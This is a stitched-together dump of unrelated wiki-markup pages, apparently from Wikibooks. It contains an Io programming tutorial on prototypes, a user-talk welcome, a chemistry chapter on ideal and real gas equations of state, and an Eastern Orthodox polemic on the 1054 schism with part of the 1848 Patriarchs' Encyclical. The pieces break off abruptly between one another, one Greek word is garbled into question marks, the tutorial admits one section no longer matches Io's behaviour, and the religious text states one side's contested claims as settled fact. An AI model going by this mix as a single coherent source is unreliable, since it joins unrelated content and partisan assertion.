Take a closer look -- when we execute '''deposit(100)''', the deposit slot is fetched in the Account object, just as '''balance''' was above.  And as with '''balance''', the interpreter ''executes'' this slot.  However, instead of it just being an unadorned value, it is a ''method''.  Remember when I said we'd get to methods in a bit?

:'''Observation'''
If you're trying to ''tell'' objects to do things, then you are obviously giving them ''messages,'' which these objects know how to interpret (somehow).  In this case, both '''balance''' and '''deposit''' are messages.  However, the ''method'' of interpreting these messages is entirely up to the object itself.  Hence the name, ''method''.  Now that we've resolved one mystery, we've introduced another -- we will get to the significance of methods versus procedures in just a bit.

:'''NOTE'''
Mathematically speaking, '''deposit''' is not a function, because it has what are called ''side-effects.''  This means that evaluating the message will cause some change in state that persists beyond the evaluation of the message.  Pure mathematical functions ''never'' do this.  And now you know why we don't refer to '''deposit''' as a function either!

When running inside '''deposit''', we see that we need to reference our balance with '''self balance'''.  Here, '''self''' is clearly referring to the object in which the method is running, thus granting us access to our object's data.

:'''Observation'''
By default, ''all slots are local to the inner-most lexical scope.''  In other words, ''there are no global variables.''

:'''Exercise'''
Try to figure out how &lt;code&gt;Account withdraw(50)&lt;/code&gt; works!

=== Inheritance ===

I promise, this will be the last diversion before we can see how objects truly become useful.  We need to find out how inheritance works, because it is a corner-stone in Io.

Looking again at our '''Account''' object above, the creation of the object involved cloning '''Object'''.  In Io, ''everything'' is ultimately a kind of '''Object''', but if you're creating something truly new and unique, you clone '''Object''' directly.

What this is saying is, well, an '''Account''' ''is an'' '''Object.''' But, we go on to specialize this object, with a balance, and a few methods to adjust the balance appropriately.

But, as with all things in Io, there is more to this very simple example than meets the eye.  Consider, if we're always bossing objects around by sending them messages, where, then, does '''self''' get sent?

If you answered '''Object''', you are not quite correct.  Remember when I made the observation that, by default, everything in Io is always local?  Method variables are no exception.  The order in which Io looks things up is as follows:

# Look first in the ''method'' itself first.  There is no local variable named '''self'''.
# Look next in the '''Account''' object.  Nope, nothing here either.
# Look next in '''Object'''.  AHA!

Each object implements a list of ''prototypes'', which it uses as a source of inspiration, if you will, to determine how to handle messages.  If you send an object a message that ''it'' doesn't know how to handle, then it'll consult with its ''prototypes'' to find out how.  If, and only if, it fails in this task, do you get that infamous error message, '''Object does not respond to''' whatever.

=== Money, Money, Money! ===

Now that we've seen the basics of what objects are, and how they can inherit from other objects, let's see how we can put this to good use.

For starters, let's assume that you want multiple accounts.  There are many different kinds of accounts, but we'll stick with a basic savings account.  These accounts, over time, accrue interest.  But, accounts from different banks accrue interest at different rates.  How do we manage this additional bit of complexity?

First, we need a savings account:

 Io&gt; SavingsAccount := Account clone

As we have seen here, we've created a new object, which relies on Account as its inspiration for how to behave.  We can verify it has no methods of its own:

 Io&gt; SavingsAccount slotNames foreach(println)
 type
 ==&gt; type

Well, OK, it has one slot, '''type''', which when invoked will return &lt;code&gt;SavingsAccount&lt;/code&gt;.  But nothing besides that.  And, yet, we can still use it like a normal account object:

 Io&gt; SavingsAccount balance
 ==&gt; 0

A savings account will typically have some interest rate:

 Io&gt; SavingsAccount interestRate := 0.045

With this, we can estimate how much we'll have at the end of the year:

 Io&gt; SavingsAccount yearEndEstimate := method(
 )-&gt;   self balance * self interestRate + self balance
 )-&gt; )
So when this executes, the order of search is to try to find '''balance''' first in the method itself, then in '''SavingsAccount''', then in '''Account''', where it'll actually be defined.

Suppose we need bank accounts for your family.  We can now do something like this:

 Io&gt; MomsAccount := SavingsAccount clone
 Io&gt; DadsAccount := SavingsAccount clone
 Io&gt; WifesAccount := SavingsAccount clone

So, we should be able to keep track of different accounts independently:

''NOTE: this section describes behavior that does not happen with current Io version. See the Talk page for details.''

 Io&gt; MomsAccount deposit(450)
 Io&gt; DadsAccount deposit(450)
 Io&gt; WifesAccount balance
 ==&gt; 900

WHOA, how'd that happen?  It looks like depositing all happens into a single balance!

:'''Exercise'''
Can you figure out why?

=== Regarding Classes, Prototypes, and Objects ===

You'll hear this term a lot in communities dedicated to object oriented programming, &quot;instantiate an object of class ''x''&quot;, where ''x'' is whatever class they happen to be talking about.  For example, to create a new list, you might see mention of a certain kind of ''list class''.

Io does not have any classes, and this is precisely why all the accounts of the preceeding section went into a single balance.  Since ''none'' of the derived objects implements its own '''balance''' message, it assumes that the object's prototype knows how to handle it.  It turns out, this assumption was a mistaken one.

How do we, then, instantiate an object such that it creates its own '''balance''' slot every time we need it?  We do this with an '''init''' method:

 Io&gt; SavingsAccount init := method(self balance := 0)

In doing this, we have converted '''SavingsAccount''' from just any ol' object, into '''a class.'''  We can now logically reason about '''SavingsAccount''' objects all day long, as if they were ''types of'' '''SavingsAccount'''.  And, indeed, they are exactly that.

We can now re-instantiate our family's accounts:

 Io&gt; MomsAccount := SavingsAccount clone
 Io&gt; DadsAccount := SavingsAccount clone
 Io&gt; WifesAccount := SavingsAccount clone

What happens here is that, right after the cloning process, '''SavingsAccount init''' is sent to ensure the object is properly initialized.

 Io&gt; MomsAccount deposit(450)
 Io&gt; DadsAccount deposit(450)
 Io&gt; WifesAccount balance
 ==&gt; 0

Note that we didn't have to manually implement, or re-implement, the '''withdraw''' or '''deposit''' methods.  Our assumption that the basic Account object knows how to handle withdrawls and deposits do still hold.  The only thing that was mistaken was where to withdraw from or deposit to.  Therefore, by creating an account type that was aware of this confusion, we could take the opportunity to clarify before any further program code was executed.

It should be noted that all classes are prototypes -- templates for use by another object.  But, not all prototypes are necessarily classes.  As we've seen, '''Account''' is also a prototype, but strictly speaking, it is not a class.  It took '''SavingsAccount''' and its '''init''' method to preserve the assumptions that allowed us to treat it as a ''type'' rather than a ''thing.''  Yet, we are able to freely define ''types'' in terms of ''things'' if we want to, as we've done in this example.  In class-based object-oriented languages, this kind of flexibility is out of the question.

=== You Needn't Get Everything Right the First Time ===

One point to remember when writing OO programs is, you don't need to get it right the first time.  Above, I said that we can have multiple kinds of accounts, each with different interest rates, but the way the software so far has evolved, it's not really easily done.  So, let's fix things:

 Io&gt; Account init := method(self balance := 0)
 Io&gt; SavingsAccount removeSlot(&quot;init&quot;)
 Io&gt; AccountWithInterest := Account clone
 Io&gt; AccountWithInterest yearEndEstimate := SavingsAccount getSlot(&quot;yearEndEstimate&quot;)
 Io&gt; SavingsAccount removeSlot(&quot;yearEndEstimate&quot;)
 Io&gt; SavingsAccount setProto(AccountWithInterest)

With a small handful of statements, we've just re-engineered the entire type hierarchy.  Now, '''Account''' is the (so-called) base class, and '''SavingsAccount''' is now just a specialized kind of '''AccountWithInterest'''.  Software which relied on '''SavingsAccount''' should still run, since we didn't change in any fundamental way ''what'' '''SavingsAccount''' objects do.

Now, we can go so far as to define what a '''CheckingAccount''' is:

 Io&gt; CheckingAccount := AccountWithInterest clone
 Io&gt; CheckingAccount interestRate := 0.015

This is why folks rarely use checking accounts to save up money.

 Io&gt; MomsChecking := CheckingAccount clone
 ...etc...

Obviously, this is a very simplistic example, but it shows you that changes to the relationships between objects, prototypes, and classes can be changed, potentially even while a program is still running.  They are not quite so static as they are with other languages.

That being said, I want to make it clear, that this kind of programming is great for ''exploratory work,'' but you should not depend on this for production code.  If you &quot;hot-fix&quot; software like this, be sure to fix the program's source code accordingly, so that such hot-fixes aren't needed in the future.

One approach towards achieving this is test-driven development.  However, this process is well beyond the scope of this book.  Here, my task is to teach you how to write software in Io.  It is not, however, ''how to design software.''  If you wish to know more about this, please see &lt;ref&gt;http://www.agiledata.org/essays/tdd.html&lt;/ref&gt;.

Hello and '''[[Wikibooks:Welcome, newcomers|welcome]]''' to [[Wikibooks]], a collection of open-content textbooks!

* The use of your own watchlist, which shows when pages you are interested in have changed.
* Your opinions carry greater weight in the [[Wikibooks:Decision making|decision making process]].
* You become a recognized member of the Wikibooks community.
* Creating an account is easy and only takes a few minutes of your time.

We hope that you choose to become a [[Wikibooks:Wikibookians|Wikibookian]] and [[Special:Userlogin|create an account]].&lt;br/&gt;
Feel free to ask any questions on my talk page or in the [[Wikibooks:Staff lounge|Staff lounge]].&lt;br/&gt;
Be sure to sign your posts and comments on talk pages with four tildes (&lt;nowiki&gt;~~~~&lt;/nowiki&gt;),
this will let other editors know you said it.&lt;br/&gt;

==Local links==
G'day Cjmcguinness, I just made a minor change to your [[Paint.NET/Tutorials]] page, to simplify the links for local pages. See [http://en.wikibooks.org/w/index.php?title=Paint.NET%2FTutorials&amp;diff=913386&amp;oldid=913335 this diff] for details of what I changed. 

When linking to subsections within a page, you can refer just to the name of the section with a &quot;#&quot; prefix. For example, you can link to this section on your talk page as just [[#Local links]]. 

When linking to subpages, you can just give the name of the subpage with a &quot;/&quot; prefix. See the diff above. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 07:17, 1 July 2007 (UTC)

G'day, sorry but Wikibooks has a policy of not accepting images with a non-commercial license. This image will be removed when an administrator gets a change. You might want to sort out an alternative image for the page that currently uses it.

      <text xml:space="preserve">== What IS an ideal gas? ==

Recall from general chemistry that the volume, pressure, temperature, and moles of a gas in a closed system can be related by the following equation, which is referred to as the '''ideal gas law''':

{{box|&lt;math&gt; PV = nRT &lt;/math&gt;}}

R is referred to as the '''Universal Gas Constant''', and it has the following values for different units of P, V, n, and T:

&lt;math&gt; R = 0.0821 \frac{L*atm}{mol*K} = 8.31 \frac{J}{mol*K} = 8.31 \frac{Pa*m^3}{mol*K} &lt;/math&gt;

One thing that may have been de-emphasized in an introductory chemistry course is the fact that ''gasses do not always follow this law''. In fact, they only do under very special circumstances.

=== Theoretical background on the ideal gas law ===

The ideal gas law relies on several rather strong assumptions about the nature of gasses, which make up the classical [[General Chemistry/Kinetic Theory of Gases|Kinetic Theory of Gases]]. These assumptions are:

# That gas molecules do not interact with each other whatsoever.
# That all collisions between molecules and each other or with the walls of the container are completely '''elastic''', meaning the mean kinetic energy of the molecules stays the same.
# That gas molecules are very small compared to the distance between them.

There are several other assumptions as well, but these will suffice to explain why deviations occur.

=== Important facts about ideal gasses ===

Ideal gasses are nice because they have several properties that make them relatively easy and useful to work with:

# A mixture of ideal gasses is also an ideal gas. Therefore, you can use the ideal gas law on the entire mixture or on any of its components without loss of validity.
# The '''Partial Pressure''' of a component in an ideal gas mixture is related to the total pressure by the equation &lt;math&gt; P_A = x_A*P&lt;/math&gt; where &lt;math&gt; x_A &lt;/math&gt; is the mole fraction of component A in the mixture.
# The ideal gas equation, if it is valid, is independent of the properties of the gas. Therefore, there is no need to look up or measure gas-specific parameters, all you need to know is 3 of the unknowns (P,V,T, and n) and you can solve for the fourth one.
# The enthalpy and entropy of an ideal gas only depend on temperature (not pressure or volume).
# Many gasses are close to ideal at low pressures and high temperatures. Therefore it can be used as a realistic '''reference state''' to which a real gas can be compared.

There are many other useful properties of ideal gasses that will be discussed in thermodynamics.

=== Deviations at high pressure ===

Suppose that you have water vapor in a small water bottle. What happens when you apply pressure to that vapor by shrinking the volume? If you apply more pressure to the bottle, the gas molecules within become closer and closer together. However, the closer molecules of a substance are to one another, the larger the [[w:dispersion forces|dispersion forces]] (and polar forces, if applicable) are between them. Eventually, the dispersion forces become significant, and the kinetic theory of gasses as stated above is no longer valid. Therefore, the ideal gas law no longer applies, or becomes a rough estimate at best.

At very high pressures, a vapor might even condense into a liquid, which would also invalidate the use of the law.

=== Deviations at low temperature ===

By definition of temperature, when the temperature of a substance decreases, this indicates a lower average kinetic energy of the molecules of that substance. Molecules with less kinetic energy also have less momentum, and therefore are more easily swayed by dispersion forces from other molecules and by gravity. Eventually, the temperature might become low enough that the forces from other molecules cause significant deviations in the path of a molecule, and in this case the ideal gas law becomes less valid.

As with pressure, a very low temperature can cause a gas to condense.

=== Rule of thumb for use of the ideal gas law ===

Due to the above two discussions, we can claim that '''the ideal gas law is a decent assumption at high temperatures and low pressures, but should not be used outside that realm'''.

== The Idea of Equations of State ==

The ideal gas law is not the only way to express relationships between system properties. There are an infinite number of possible ways that you ''could'' propose to correlate system variables, although thermodynamics provides some guidelines regarding how many variables to correlate and what types of correlations we should look for. In particular, it is most useful to correlate relationships between '''[[w:state variables|state variables]]''', for which changes in the properties do not depend on how the change occurred.

Any equation that relates state variables is called an '''[[w:equation of state|equation of state]]'''. The most commonly-used equations of state relate the variables P, T, V, and n (pressure, temperature, volume, and number of moles) since they are all measurable variables whereas many other possible variables are not directly measurable (such as [[w:enthalpy|enthalpy]], which will be discussed later).

== Compressibility ==

There is a highly useful quantity for describing how much a gaseous system deviates from ideality, which is called the '''compressibility''' of the gas. The compressibility Z is defined as:

{{box|&lt;math&gt; Z = \frac{P*V}{n*R*T} &lt;/math&gt; }}

For an ideal gas, since &lt;math&gt; PV = nRT &lt;/math&gt;, &lt;math&gt; Z = 1 &lt;/math&gt;. Therefore, '''any deviation of the compressibility from 1 is a nonideality'''.

The compressibility of a liquid is very small, due to a small volume per mole of substance compared to that of a gas.

=== Ideal Gas Law Extension ===

One use of the compressibility is that it allows a simple extension of the ideal gas law, which is completely general.

{{box|'''Real-Gas Extension to the Ideal Gas Law'''

&lt;math&gt; PV = nRTZ &lt;/math&gt; }}

Unfortunately, Z is not a constant for any material, but changes with pressure and temperature. However, in a later section you will learn a technique called the '''generalized compressibility method''' with which you can estimate the value of Z for ''any'' substance, given certain data. Once it is known, this extension can be used to calculate an unknown system property.

== Alternatives to the ideal gas law 1: Van der Waals Equation ==

One of the oldest equations that was developed to take non-ideality into account is called the '''[[w:Van der Waals equation|Van der Waals Equation]]''', which has two substance-dependent parameters. One takes into account the interactions between particles, and the other the fact that particles have volume, sometimes substantial.

The Van der Waals equation is as follows:

{{box|&lt;math&gt;\left(p + \frac{n^2 a}{V^2}\right)\left(V-nb\right) = nRT&lt;/math&gt; where a and b depend on the gas being analyzed}}

A list of values for a and b can be found on Wikipedia at [[w:Van der Waals constants (data page)|this page]].

The Van der Waals equation is significantly more accurate than the ideal gas law and can be used to crudely predict when a gas will condense. However, it is not sufficiently accurate for many industrial purposes, and therefore other methods have been sought since then.

== Alternatives to the ideal gas law 2: Virial Equation ==

The Virial equation is an equation which has a potentially infinite number of parameters that depend on the properties of the substances involved. It is important because it can be shown to be a valid extension to the ideal gas law using statistical theories (whereas the other equations of state have been derived semi-empirically).

The virial equation can take several forms, depending on the data one has available. The one in terms of molar volume is:

&lt;math&gt;Z = \frac{PV_m}{RT} = 1 + \frac{B}{V_m} + \frac{C}{V_m^2} + \frac{D}{V_m^3} + \dots&lt;/math&gt;

where &lt;math&gt; V_m &lt;/math&gt; is the molar volume, which is the same as &lt;math&gt; \frac{V}{n} &lt;/math&gt;

== Alternatives to the ideal gas law 3: Peng-Robinson equation ==

One of the more modern equations of state is the '''Peng-Robinson''' equation, which is most useful for describing nonpolar molecules such as hydrocarbons or nitrogen. The Peng-Robinson equation has two parameters like the Van der Waals equation, but unlike the latter, one of the parameters is not constant; it depends on the temperature of the system as well as the properties of the substance inside.

      <text xml:space="preserve">==The Schism of the Roman Catholic Church from the Eastern Orthodox: 1054-1954==

Exactly nine hundred years have passed since the separation of the two great Churches of Christendom when the Western Church broke away from the Eastern Orthodox. Many still seek the cause of this most unfortunate division. Actually, it can be found in the difference concerning the Primacy of the Pope of Rome. Until the Fifth Century A.D. there was not even a single instance of dissension or antagonism between the two Churches. The Bishop of Rome had always been considered the First in the order of hierarchy. This was a natural consequence of the position of Rome as the capital of the Roman Empire. When Constantinople became the new capital of the Byzantine State its Bishop assumed the second position in the ranks of the hierarchy. The third canon of the Second Ecumenical Council (381) designates the position of honor of the Bishop of Constantinople as second only to that of the Bishop of Rome. This decision of the Council is based on the premise that Constantinople is new Rome, and, incidentally, it has been retained among the titles of the Patriarch of Constantinople. This indicates, as was brought out at the Council, that the political importance of the city defined the honorary status of its hierarchy. The same fact was repeated with emphasis by the now renown 28th Canon of the Fourth Ecumenical Council held at Chalcedon in 451. At that time, the Bishop of Constantinople was acclaimed as equal in honor to the Bishop of Rome. In the meantime, erroneous beliefs began to circulate in the Church of the West. Of these, the most serious was an addition to the Creed of Nicaea-Constantinople concerning the Holy Spirit. The Church of Rome wanted to say that the Holy Spirit proceeds from the Father and from the Son. In Latin, this addition was accomplished by the word, “filioque.” It should be made clear at this point that the Creed or ??S???O, was compiled and authorized as the Christian Confessions of faith by the First and Second Ecumenical Councils. The first seven articles of the Creed were approved at the First Council and the remaining five were composed at the Second Council which was held in Constantinople. The Eighth article states “and in the Holy Spirit, the Lord, Giver of Life, who proceedeth from the Father, who together with the Father and the Son is worshipped...” This addition of “filioque” (“and from the Son”) was first heard in Spain during the middle of the Sixth Century. From there, this innovation spread to other western countries. It is most noteworthy however, that during the early part of the Ninth Century, Pope Leo III protested against this addition to the Creed. Convinced that it should remain as it has been written and proclaimed by the first two Ecumenical Councils, he ordered that the Creed be inscribed without any change upon two silver plaques. These were placed in St. Peter’s at Rome for all to see. This is a historical fact which is accepted by all historians as true. The first to object strongly to this addition to the Creed, and to other errors of the Western Church, was Photios, the great Patriarch of Constantinople, who flourished in the middle of the Ninth Century. Photios was a brilliant scholar and theologian who held a high position in the Imperial Byzantine Court. He attained great literary fame with his monumental work, “Myrio Biblos,” in which he summarized 280 ancient writings of which the majority were subsequently lost. Due to his great ability and exceptional virtues as a layman he was admitted to the priesthood and in a period of six days he was ordained deacon, priest and bishop. On Christmas Day of 857, he was enthroned as Patriarch of Constantinople. The discord between the Eastern and the Western Church continued on a livelier vein after Patriarch Photios. The Eastern Church, with the Patriarch of Constantinople at its head, protested against the errors in dogma taught by the Western Church. Constant appeals were made to Rome to renounce all error and conform with the teachings of the Seven Ecumenical Councils of the first eight centuries. Simultaneously, the Western Church, with the Pope as its head, maintained that the entire Christian Church was obliged to adhere without discussion to the pronouncements of the Roman See. They maintained that the primate of the Church of Rome was the vicar of Christ on earth, because he was supposedly the heir to the primacy of St. Peter whom Christ our Lord had installed as head of the universal Church, and who had founded the Christian Church of Rome. Now let us see what we can learn from the original account of the events in question: (a) We should first consider that passage from the Gospel according to St. Matthew upon which the Roman Catholics base the primacy of St. Peter. Our Lord was at Caesarea of Philippi (Matt. 16) when He asked His Disciples: “Whom do men say that I am? And they said, Some say that thou art John the Baptist; some, Elias and others Jeremias, or one of the prophets. He saith unto them, but whom say ye that I am? And Simon Peter answered and said, Thou art Christ the Son of the Living God. And Jesus answered and said unto him, Blessed art thou, Simon Bar-Jonah: for the flesh and blood hath not revealed it into thee, but my Father who is in heaven. And I say also unto thee, that thou art Peter; and upon this rock I will build my Church; and the gates of hell shall not prevail against it.” (Matt. 16:13-18) It is quite evident from these words of our Lord that He built His Church not upon Peter for then He would have clearly said, “Thou art Peter and upon thee I will build my Church,” but upon the rock of the true Faith which Peter confessed. Christ our Lord clearly said that His Church is built upon the truth which Peter declared that our Lord Jesus Christ is the Son of the living God. Only through considerable distortion of the text can one draw the conclusion of the Roman Catholics, that Christ built the Church upon Peter. (b) It is also clear from the Scriptures that St. Peter had no authority over the Apostles. In his Epistle to the Galatians, St. Paul states that when he saw Peter was not thinking correctly, he corrected him in the presence of others, “But when Peter was come to Antioch, I withstood him to the face, because he was to be blamed.” (Gal. 2:11) Further down St. Paul elaborates by saying, “ . . . when I saw that they walked not uprightly according to the truth of the gospel, I said unto Peter before them all) if thou, being a Jew, livest after the manner of Gentiles, and not as do the Jews, why compellest thou the Gentiles to live as do the Jews?” (Gal. 2:14) On the basis of these words of St. Paul we may justly question, “Is there even a trace of recognition here of Peter’s authority to teach without the possibility of error?” (c) Concerning the foundation of the Christian Church in Rome there is authoritative testimony that it was not accomplished by St. Peter. It was established by Christians who settled in Rome. Moreover, St. Paul considered it his Church. He mentioned this in his epistle to the Romans, “. . . from Jerusalem and round about unto Illyricum, I have fully preached the gospel of Christ. Yea, so have I strived to preach the gospel, not where Christ was named, lest I should build upon another man’s foundation ... for which, cause also I have been much hindered from coming to you. But now having no more place in these parts, and having a great desire these many years to come unto you; whensoever I take my journey into Spain, I will come to you: for I trust to see you in my journey.” (Rom. 15:19-20, 22-23) From this passage, therefore, we clearly see that St. Paul had no knowledge that Peter was in Rome or that St. Peter had founded the Church there. On the contrary, he says that he feels obliged to preach the gospel where no other Apostle taught so that he would not build upon the foundation laid by another. Surely this is an explicit testimony that St. Peter was in no way connected with the foundation of the Church of Rome. Actually St. Peter served the Church for many years in Antioch, as verified by St. Jerome, and then went to Rome where he suffered martyrdom with St. Paul. (d) In conclusion it should be pointed out that the order of precedence given to the Apostolic Sees was determined exclusively by the political importance of various cities. The Bishop of Rome was recognized as first because Rome was capital of the empire. Originally, the Bishop of Constantinople was designated as second by the Second Ecumenical Council. Subsequently, when Constantinople became the capital of the Byzantine Empire and was referred to as New Rome, the Fourth Ecumenical Council proclaimed the Bishop of Constantinople equal in rank with the Bishop of Rome. The Bishop of Alexandria was designated third, because his city was then the great center of learning; and following him were the Bishops of Antioch and Jerusalem. If the position of honor were determined not by the political but by the religious significance of the city, does it not stand to reason that the primacy of honor would be reserved for Jerusalem, the Mother Church of Christendom? There would be no dispute in that case, for our Lord lived there and was crucified and arose from the tomb. Moreover, the first Christian Church was founded in Jerusalem on the day of Pentecost. These are the true and accurate facts as they are brought to light by the authentic documents which make up Ecclesiastical History. It is very unfortunate that the Western Church insists on its view for so many centuries. We Orthodox are deeply grieved that our Roman Catholic brethren distort the facts. We are praying daily and will continue to pray that the Roman Catholic Church will again embrace the truth, as many learned laymen of that faith have done already. That event will be one of the most momentous in the entire history of mankind. It will mark the beginning of the fulfillment of the prayer of Lord on the night of His betrayal, “Father, I pray that they all may be one; as thou Father art in me, and I in thee, that they also may be one in us; that the world may believe that thou hast sent me.”

== Encyclical of the Eastern Patriarchs, 1848 ==
A Reply to the Epistle of Pope Pius IX, &quot;to the Easterns&quot;
To All the Bishops Everywhere, Beloved in the Holy Ghost, Our Venerable, Most Dear Brethren; and to their Most Pious Clergy; and to All the Genuine Orthodox Sons of the One, Holy, Catholic and Apostolic Church: Brotherly Salutation in the Holy Spirit, and Every Good From God, and Salvation.

The holy, evangelical and divine Gospel of Salvation should be set forth by all in its original simplicity, and should evermore be believed in its unadulterated purity, even the same as it was revealed to His holy Apostles by our Savior, who for this very cause, descending from the bosom of God the Father, made Himself of no reputation and took upon Him the form of a servant (Phil. ii. 7); even the same, also, as those Apostles, who were ear and eye witnesses, sounded it forth, like clear-toned trumpets, to all that are under the sun (for their sound is gone out into all lands, and their words into the ends of the world); and, last of all, the very same as the many great and glorious Fathers of the Catholic Church in all parts of the earth, who heard those Apostolic voices, both by their synodical and their individual teachings handed it down to all everywhere, and even unto us. But the Prince of Evil, that spiritual enemy of man's salvation, as formerly in Eden, craftily assuming the pretext of profitable counsel, he made man to become a transgressor of the divinely-spoken command. so in the spiritual Eden, the Church of God, he has from time to time beguiled many; and, mixing the deleterious drugs of heresy with the clear streams of orthodox doctrine, gives of the potion to drink to many of the innocent who live unguardedly, not giving earnest heed to the things they have heard (Heb. ii. 10), and to what they have been told by their fathers (Deut. xxxii. 7), in accordance with the Gospel and in agreement with the ancient Doctors; and who, imagining that the preached and written Word of the LORD and the perpetual witness of His Church are not sufficient for their souls' salvation, impiously seek out novelties, as we change the fashion of our garments, embracing a counterfeit of the evangelical doctrine.

2. Hence have arisen manifold and monstrous heresies, which the Catholic Church, even from her infancy, taking unto her the whole armor of God, and assuming the sword of the Spirit, which is the Word of God (Eph. vi. 13-17,) has been compelled to combat. She has triumphed over all unto this day, and she will triumph for ever, being manifested as mightier and more illustrious after each struggle.

3. Of these heresies, some already have entirely failed, some are in decay, some have wasted away, some yet flourish in a greater or less degree vigorous until the time of their return to the Faith, while others are reproduced to run their course from their birth to their destruction. For being the miserable cogitations and devices of miserable men, both one and the other, struck with the thunderbolt of the anathema of the seven Ecumenical Councils, shall vanish away, though they may last a thousand years; for the orthodoxy of the Catholic and Apostolic Church, by the living Word of God, alone endures for ever, according to the infallible promise of the LORD: the gates of hell shall not prevail against it (Matt. xviii. 18). Certainly, the mouths of ungodly and heretical men, however bold, however plausible and fair-speaking, however smooth they may be, will not prevail against the orthodox doctrine winning, its way silently and without noise. But, wherefore doth the way of the wicked prosper? (Jer. xii. 1.) Why are the ungodly exalted and lifted up as the cedars of Lebanon (Ps. xxxvii. 35), to defile the peaceful worship of God? The reason of this is mysterious, and the Church, though daily praying that this cross, this messenger of Satan, may depart from her, ever hears from the Lord: My grace is sufficient for thee, my strength is made perfect in weakness (2. Cor. xii. 9). Wherefore she gladly glories in her infirmities, that the power of Christ may rest upon her, and that they which are approved may be made manifest (1. Cor. x. 19).

4. Of these heresies diffused, with what sufferings the LORD hath known, over a great part of the world, was formerly Arianism, and at present is the Papacy. This, too, as the former has become extinct, although now flourishing, shall not endure, but pass away and be cast down, and a great voice from heaven shall cry: It is cast down (Rev. xii. 10).

5. The new doctrine, that &quot;the Holy Ghost proceedeth from the Father and the Son,&quot; is contrary to the memorable declaration of our LORD, emphatically made respecting it: which proceedeth from the Father (John xv. 26), and contrary to the universal Confession of the Catholic Church as witnessed by the seven Ecumenical Councils, uttering &quot;which proceedeth from the Father.&quot; (Symbol of Faith).

i. This novel opinion destroys the oneness from the One cause, and the diverse origin of the Persons of the Blessed Trinity, both of which are witnessed to in the Gospel.

ii. Even into the divine Hypostases or Persons of the Trinity, of equal power and equally to be adored, it introduces diverse and unequal relations, with a confusion or commingling of them.

iii. It reproaches as imperfect, dark, and difficult to be understood, the previous Confession of the One Holy Catholic and Apostolic Church.

iv. It censures the holy Fathers of the first Ecumenical Synod of Nice and of the second Ecumenical Synod at Constantinople, as imperfectly expressing what relates to the Son and Holy Ghost, as if they had been silent respecting the peculiar property of each Person of the Godhead, when it was necessary that all their divine properties should be expressed against the Arians and Macedonians.

v. It reproaches the Fathers of the third, fourth, fifth, sixth, and seventh Ecumenical Councils, which had published over the world a divine Creed, perfect and complete, and interdicted under dread anathemas and penalties not removed, all addition, or diminution, or alteration, or variation in the smallest particular of it, by themselves or any whomsoever. Yet was this quickly to be corrected and augmented, and consequently the whole theological doctrine of the Catholic Fathers was to be subjected to change, as if, forsooth, a new property even in regard to the three Persons of the Blessed Trinity had been revealed.

vi. It clandestinely found an entrance at first in the Churches of the West, &quot;a wolf in sheep's clothing,&quot; that is, under the signification not of procession, according to the Greek meaning in the Gospel and the Creed, but under the signification of mission, as Pope Martin explained it to the Confessor Maximus, and as Anastasius the Librarian explained it to John VIII.

vii. It exhibits incomparable boldness, acting without authority, and forcibly puts a false stamp upon the Creed, which is the common inheritance of Christianity.

viii. It has introduced huge disturbances into the peaceful Church of God, and divided the nations.

ix. It was publicly proscribed, at its first promulgation, by two ever-to-be-remembered Popes, Leo III and John VIII, the latter of whom, in his epistle to the blessed Photius, classes with Judas those who first brought the interpolation into the Creed.

x. It has been condemned by many Holy Councils of the four Patriarchs of the East.

xi. It was subjected to anathema, as a novelty and augmentation of the Creed, by the eighth Ecumenical Council, congregated at Constantinople for the pacification of the Eastern and Western Churches.

xii. As soon as it was introduced into the Churches of the West it brought forth disgraceful fruits, bringing with it, little by little, other novelties, for the most part contrary to the express commands of our Savior in the Gospel—commands which till its entrance into the Churches were closely observed. Among these novelties may be numbered sprinkling instead of baptism, denial of the divine Cup to the Laity, elevation of one and the same bread broken, the use of wafers, unleavened instead of real bread, the disuse of the Benediction in the Liturgies, even of the sacred Invocation of the All-holy and Consecrating Spirit, the abandonment of the old Apostolic Mysteries of the Church, such as not anointing baptized infants, or their not receiving the Eucharist, the exclusion of married men from the Priesthood, the infallibility of the Pope and his claim as Vicar of Christ, and the like. Thus it was that the interpolation led to the setting aside of the old Apostolic pattern of well nigh all the Mysteries and all doctrine, a pattern which the ancient, holy, and orthodox Church of Rome kept, when she was the most honored part of the Holy, Catholic and Apostolic Church.

xiii. It drove the theologians of the West, as its defenders, since they had no ground either in Scripture or the Fathers to countenance heretical teachings, not only into misrepresentations of the Scriptures, such as are seen in none of the Fathers of the Holy Catholic Church, but also into adulterations of the sacred and pure writings of the Fathers alike of the East and West.

xiv. It seemed strange, unheard of, and blasphemous, even to those reputed Christian communions, which, before its origin, had been for other just causes for ages cut off from the Catholic fold.

xv. It has not yet been even plausibly defended out of the Scriptures, or with the least reason out of the Fathers, from the accusations brought against it, notwithstanding all the zeal and efforts of its supporters. The doctrine bears all the marks of error arising out of its nature and peculiarities. All erroneous doctrine touching the Catholic truth of the Blessed Trinity, and the origin of the divine Persons, and the subsistence of the Holy Ghost, is and is called heresy, and they who so hold are deemed heretics, according to the sentence of St. Damasus, Pope of Rome, who says: &quot;If any one rightly holds concerning the Father and the Son, yet holds not rightly of the Holy Ghost, he is an heretic&quot; (Cath. Conf. of Faith which Pope Damasus sent to Paulinus, Bishop of Thessalonica). Wherefore the One, Holy, Catholic, and Apostolic Church, following in the steps of the holy Fathers, both Eastern and Western, proclaimed of old to our progenitors and again teaches today synodically, that the said novel doctrine of the Holy Ghost proceeding from the Father and the Son is essentially heresy, and its maintainers, whoever they be, are heretics, according to the sentence of Pope St. Damasus, and that the congregations of such are also heretical, and that all spiritual communion in worship of the orthodox sons of the Catholic Church with such is unlawful. Such is the force of the seventh Canon of the third Ecumenical Council.

